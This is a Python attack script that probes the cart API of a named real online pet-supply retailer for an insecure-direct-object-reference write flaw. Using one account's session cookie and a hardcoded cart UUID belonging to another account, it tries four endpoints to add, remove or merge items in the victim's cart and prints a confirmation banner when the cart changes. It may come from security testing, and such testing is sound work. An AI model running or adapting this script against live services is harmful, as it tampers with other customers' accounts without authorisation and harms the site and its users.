#!/usr/bin/env python3
"""
Final test - try exact endpoints from 2025 research
"""

import requests
import json
import sys
import time

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_write_final.py <session_cookie>")
    sys.exit(1)

# Get Account B's own cart UUID first
headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "X-Requested-With": "XMLHttpRequest"
}

print(f"[*] Final cart write IDOR test")
print()

# Get Account B's cart
print("[*] Getting Account B's own cart...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart", headers=headers)
own_cart_uuid = None
if r.status_code == 200:
    own_cart = r.json()
    own_cart_uuid = own_cart.get("sid")
    print(f"[+] Account B cart UUID: {own_cart_uuid}")
else:
    print(f"[!] Failed to get own cart: {r.status_code}")

# Get Account A's cart state
print()
print("[*] Getting Account A's cart state...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code != 200:
    print(f"[!] Failed: {r.status_code}")
    sys.exit(1)

cart_before = r.json()
before_count = len(cart_before.get("articles", []))
before_total = cart_before.get("summary", {}).get("grandTotal", 0)
existing_article_id = cart_before.get("articles", [{}])[0].get("id") if cart_before.get("articles") else None

print(f"[+] Cart before: {before_count} items, {before_total} EUR")
print()

# Test exact endpoints from 2025 research
OFFER_ID = 2966095  # Real offerId

# Test 1: POST /articles (exact from instructions)
print("[*] Test 1: POST /articles (exact 2025 endpoint)")
print(f"[*] POST /checkout/api/cart-api/v2/cart/{CART_UUID}/articles")
payload = {"offerId": OFFER_ID}

try:
    r = requests.post(
        f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}/articles",
        headers=headers,
        json=payload,
        timeout=10
    )
    print(f"    HTTP {r.status_code}")
    
    if r.status_code in [200, 201]:
        print(f"    [!!!] SUCCESS! HTTP {r.status_code}")
        try:
            response_json = r.json()
            print(f"    Response: {json.dumps(response_json, indent=2)[:500]}")
        except:
            print(f"    Response: {r.text[:500]}")
        
        # Verify immediately
        time.sleep(1)
        r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
        if r2.status_code == 200:
            cart_after = r2.json()
            after_count = len(cart_after.get("articles", []))
            after_total = cart_after.get("summary", {}).get("grandTotal", 0)
            print(f"    [!!!] VERIFIED: Cart now has {after_count} items (was {before_count})")
            print(f"    [!!!] Total: {after_total} EUR (was {before_total} EUR)")
            print()
            print("[!!!] ========================================")
            print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
            print("[!!!] ========================================")
            print(f"[!!!] Endpoint: POST /checkout/api/cart-api/v2/cart/{CART_UUID}/articles")
            print(f"[!!!] Payload: {json.dumps(payload)}")
            sys.exit(0)
    else:
        print(f"    Response: {r.text[:300]}")
except Exception as e:
    print(f"    Error: {e}")

# Test 2: POST /add with form-data
print()
print("[*] Test 2: POST /add (form-data)")
headers_form = {
    "Cookie": SESSION_COOKIE,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

try:
    r = requests.post(
        f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}/add",
        headers=headers_form,
        data=f"offerId={OFFER_ID}&quantity=1",
        timeout=10
    )
    print(f"    HTTP {r.status_code}")
    
    if r.status_code in [200, 201]:
        print(f"    [!!!] SUCCESS! HTTP {r.status_code}")
        print(f"    Response: {r.text[:500]}")
        
        # Verify
        time.sleep(1)
        r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
        if r2.status_code == 200:
            cart_after = r2.json()
            after_count = len(cart_after.get("articles", []))
            if after_count > before_count:
                print(f"    [!!!] VERIFIED: Cart now has {after_count} items")
                print()
                print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                sys.exit(0)
    else:
        print(f"    Response: {r.text[:300]}")
except Exception as e:
    print(f"    Error: {e}")

# Test 3: Remove
if existing_article_id:
    print()
    print(f"[*] Test 3: POST /articles/{existing_article_id}/remove")
    try:
        r = requests.post(
            f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{existing_article_id}/remove",
            headers=headers,
            timeout=10
        )
        print(f"    HTTP {r.status_code}")
        
        if r.status_code in [200, 204]:
            print(f"    [!!!] SUCCESS! HTTP {r.status_code}")
            print(f"    Response: {r.text[:500]}")
            
            # Verify
            time.sleep(1)
            r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
            if r2.status_code == 200:
                cart_after = r2.json()
                after_count = len(cart_after.get("articles", []))
                if after_count < before_count:
                    print(f"    [!!!] VERIFIED: Cart now has {after_count} items (was {before_count})")
                    print()
                    print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                    sys.exit(0)
        else:
            print(f"    Response: {r.text[:300]}")
    except Exception as e:
        print(f"    Error: {e}")

# Test 4: Merge
if own_cart_uuid:
    print()
    print(f"[*] Test 4: POST /merge")
    payload_merge = {"sourceCartId": own_cart_uuid}
    try:
        r = requests.post(
            f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}/merge",
            headers=headers,
            json=payload_merge,
            timeout=10
        )
        print(f"    HTTP {r.status_code}")
        
        if r.status_code in [200, 201, 204]:
            print(f"    [!!!] SUCCESS! HTTP {r.status_code}")
            print(f"    Response: {r.text[:500]}")
            
            # Verify
            time.sleep(1)
            r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
            if r2.status_code == 200:
                cart_after = r2.json()
                after_count = len(cart_after.get("articles", []))
                print(f"    [!!!] VERIFIED: Cart now has {after_count} items")
                print()
                print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                sys.exit(0)
        else:
            print(f"    Response: {r.text[:300]}")
    except Exception as e:
        print(f"    Error: {e}")

print()
print("[*] Final verification...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    after_total = cart_after.get("summary", {}).get("grandTotal", 0)
    print(f"[+] Cart after: {after_count} items, {after_total} EUR")
    
    if before_count != after_count or abs(before_total - after_total) > 0.01:
        print()
        print("[!!!] ========================================")
        print("[!!!] CART WAS MODIFIED!")
        print("[!!!] ========================================")
        print(f"[!!!] Before: {before_count} items, {before_total} EUR")
        print(f"[!!!] After:  {after_count} items, {after_total} EUR")
    else:
        print("[!] Cart unchanged")

